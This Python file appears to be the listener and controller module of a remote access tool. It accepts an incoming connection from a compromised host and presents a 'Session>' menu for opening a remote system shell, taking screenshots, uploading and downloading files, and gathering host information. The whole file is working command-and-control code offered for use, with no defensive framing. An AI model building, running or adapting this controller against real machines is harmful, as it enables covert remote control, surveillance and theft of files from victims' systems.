#!/usr/bin/python3.7
# -*- coding: utf-8 -*-
# @Author  : Cr4y0n
# @Software: PyCharm
# @Time    : 2021/4/8 23:30

import os
import sys
sys.path.append("..")
import socket
from misc.color import Colors
from serverModule.shell import Shell
from lib.dsSocket import *
from serverModule.fileOperation import FileOPT
from serverModule.screen import Screen
from serverModule.infoGather import infoGather
from argparse import ArgumentParser

class Listening():
    keyWord = "listen"
    moduleName = "listening"

    def __init__(self):
        self.args = self.parseArgs()
        self.listen()

    def parseArgs(self):
        parser = ArgumentParser(prog=self.keyWord)
        parser.add_argument("-lh", "--lhost", type=str, required=True, help=f"The listening host")
        parser.add_argument("-lp", "--lport", type=int, required=False, default=1116, help=f"The listening port, default is 1116")
        return parser.parse_args()

    # 连接
    def connect(self, host, port):
        serverHost = host
        serverPort = port
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((serverHost, serverPort))
        server.listen(5)
        server.setblocking(False)
        server.settimeout(200)
        msg = " Server is Listening <%s:%s>\n    Waiting……" % (serverHost, serverPort)
        print(Colors.CYAN + "[*]" + Colors.END + msg)
        try:
            clientSocket, clientAddress = server.accept()
        except KeyboardInterrupt:
            server.close()
            return
        print(Colors.GREEN + "[+]" + Colors.END + " Receive The Connection " + Colors.GREEN + "<%s:%s>" % (
        clientAddress[0], clientAddress[1]) + Colors.END)
        return server, clientSocket, clientAddress

    # 监听
    def listen(self):
        try:
            host = self.args.lhost
            port = self.args.lport
            server, clientSocket, clientAddress = self.connect(host, port)
            self.usage()
        except OSError:
            print(Colors.YELLOW + "[!]" + Colors.END + " IP Address Error.")
        except ValueError:
            print(Colors.YELLOW + "[!]" + Colors.END + "Port Error.")
        except KeyboardInterrupt:
            return 0
        else:
            optionsList = ["shell", "upload", "download", "quit", "q", "exit"]
            os.chdir(r"..")
            while True:
                try:
                    choice = input(Colors.RED + "Session> " + Colors.END).lower()
                    if choice in optionsList:
                        pass
                    if choice == "shell":
                        print(Colors.GREEN + "[+]" + Colors.END + " OS Shell Created")
                        shell = Shell(clientSocket)
                        shell.shell()
                    elif choice[:6].lower() == "upload":
                        FileOPT(choice, clientSocket).fileUpload()
                    elif choice[:8].lower() == "download":
                        FileOPT(choice, clientSocket).fileDownload()
                    elif choice.lower() == "screen":
                        Screen(clientSocket)
                    elif choice.lower() == "info":
                        infoGather(clientSocket, clientAddress)
                    elif choice.lower() == "help":
                        self.usage()
                    elif choice in ["quit", "q", "exit"]:
                        # clientSocket.send(choice.encode(Encode.encoding))
                        DShellSend(clientSocket, choice)
                        break
                except KeyboardInterrupt:
                    break
                except:
                    pass
            clientSocket.shutdown(2)
            clientSocket.close()
            server.close()

    def usage(self):
        usage = """
------------------------------------------------------------------------------------
    shell                                   into a system shell
    screen                                  screenshots
    upload     [localFile] <remoteName>     upload a local file to remote machine
    download   [remoteFile] <localName>     download a remote file to local machine
    info                                    collect host information
    help                                    show the usage
        """
        print(f"\033[34m{usage}\033[0m")

if __name__ == "__main__":
    Listening()